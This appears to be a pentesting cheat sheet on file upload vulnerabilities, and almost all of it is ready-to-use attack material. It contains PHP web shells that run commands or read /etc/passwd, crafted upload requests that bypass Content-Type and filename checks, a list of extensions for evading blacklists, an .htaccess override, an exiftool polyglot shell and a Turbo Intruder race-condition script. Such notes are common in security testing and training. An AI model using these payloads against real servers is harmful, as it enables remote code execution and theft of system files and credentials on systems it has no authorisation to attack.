---
title: File Upload Vulnerabilities
desc: Examples of File Upload Vulnerabilities.
tags: [Web]
alts: []
website:
render_with_liquid: false
---

## Web shell (.php)

```php
<?php echo file_get_contents('/etc/passwd');  ?>

// https://vulnerable.com/exploit.php?cmd=whoami
<?php echo system($_GET['cmd']); ?>
```

<br />

## Content-Type validation (change Content-Type)

```php
POST /upload HTTP/1.1
...

------abcdefghijk
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/etc/passwd');  ?>

------abcdefghijk
...
```

<br />

## Directory Traversal (change filename)

```php
POST /upload HTTP/1.1
...

------abcdefghijk
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/etc/passwd');  ?>

------abcdefghijk
```

<br />

## File extensions for bypass blacklist

```
exploit.php
exploit.php3
exploit.php4
exploit.php5
exploit.phtml
exploit.php.
exploit.php.jpg
exploit.php.png
exploit%2Ephp
exploit.p.phphp
exploit.php%00.jpg
exploit.php%0d%0a.jpg
```

<br />

## Override the server configuration

```php
POST /upload HTTP/1.1
...

------abcdefghijk
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .abc

------abcdefghijk
```

<br />

## Polyglot web shell (using exiftool)

```sh
exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" example.jpg -o polyglot.php
```

<br />

## Race condition (using Turbo Intruder)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,)

    request_post = '''POST /avatar/upload HTTP/1.1
Host: vulnerable.com
...
...
Connection: close

------abcdefghi
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/etc/passwd');  ?>

------abcdefghijk--

'''

    request_get = '''GET /files/avatars/exploit.php HTTP/1.1
Host: vulnerable.com
...
...
Connection: close


'''

    engine.queue(request_post, gate='race1')
    for i in range(5):
        engine.queue(request_get, gate='race1')


    engine.openGate('race1')
    engine.complete(timeout=60)
    


def handleResponse(req, interesting):
    table.add(req)
```
